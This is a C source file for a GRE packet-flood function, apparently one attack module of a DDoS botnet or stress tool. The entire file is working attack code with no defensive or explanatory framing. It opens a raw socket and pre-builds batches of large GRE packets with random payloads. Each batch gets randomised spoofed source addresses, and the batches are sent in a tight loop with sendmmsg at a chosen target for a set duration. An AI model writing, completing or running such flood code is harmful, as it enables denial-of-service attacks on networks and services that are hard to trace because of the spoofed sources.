#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <stdint.h>

#include "gre_attack.h"
#include "../headers/protocol.h"
#include "../headers/checksum.h"

struct gre_header {
    uint16_t flags;
    uint16_t protocol;
};

#define GRE_PAYLOAD 1400
#define BATCH 64

static inline uint64_t xorshift64(uint64_t *s) {
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    return *s = x;
}

void* gre_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    attack_option* opt_proto = find_option(params, OPT_PROTO);
    uint16_t gre_proto = opt_proto ? get_option_u16(opt_proto) : 0x0800; // ETH_P_IP

    size_t pkt_size = sizeof(struct iphdr) + sizeof(struct gre_header) + GRE_PAYLOAD;

    /* Seed xorshift PRNG */
    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32);
    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;

    /* Pre-allocate batch of packets */
    char *pkt_buf = malloc(pkt_size * BATCH);
    if (!pkt_buf) { close(fd); return NULL; }

    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    struct sockaddr_in dest;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    /* Initialize all packets with constant fields */
    for (int i = 0; i < BATCH; i++) {
        char *pkt = pkt_buf + (pkt_size * i);
        memset(pkt, 0, pkt_size);

        struct iphdr*      ip  = (struct iphdr*)pkt;
        struct gre_header* gre = (struct gre_header*)(pkt + sizeof(struct iphdr));
        char*              dat = pkt + sizeof(struct iphdr) + sizeof(struct gre_header);

        ip->version  = 4;
        ip->ihl      = 5;
        ip->tos      = 0;
        ip->tot_len  = htons(pkt_size);
        ip->frag_off = 0;
        ip->ttl      = 255;
        ip->protocol = 47; // GRE
        ip->daddr    = params->target_addr.sin_addr.s_addr;

        gre->flags    = htons(0x0000);
        gre->protocol = htons(gre_proto);

        /* Random payload */
        uint64_t r;
        for (int j = 0; j < GRE_PAYLOAD; j += 8) {
            r = xorshift64(&rng_state);
            size_t remain = GRE_PAYLOAD - j;
            memcpy(dat + j, &r, remain < 8 ? remain : 8);
        }

        /* iov / msg setup */
        iovs[i].iov_base = pkt;
        iovs[i].iov_len  = pkt_size;

        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov     = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen  = 1;
        msgs[i].msg_hdr.msg_name    = &dest;
        msgs[i].msg_hdr.msg_namelen = sizeof(dest);
    }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        /* Update per-packet varying fields: src IP, IP id, IP checksum */
        for (int i = 0; i < BATCH; i++) {
            char *pkt = pkt_buf + (pkt_size * i);
            struct iphdr* ip = (struct iphdr*)pkt;

            uint64_t r = xorshift64(&rng_state);

            ip->saddr = (uint32_t)r;
            ip->id    = htons((uint16_t)(r >> 32));
            ip->check = 0;
            ip->check = generic_checksum(ip, sizeof(struct iphdr));
        }

        sendmmsg(fd, msgs, BATCH, MSG_NOSIGNAL);

        if ((++iter & 0x3F) == 0 && time(NULL) >= end_time) break;
    }

    free(pkt_buf);
    close(fd);
    return NULL;
}
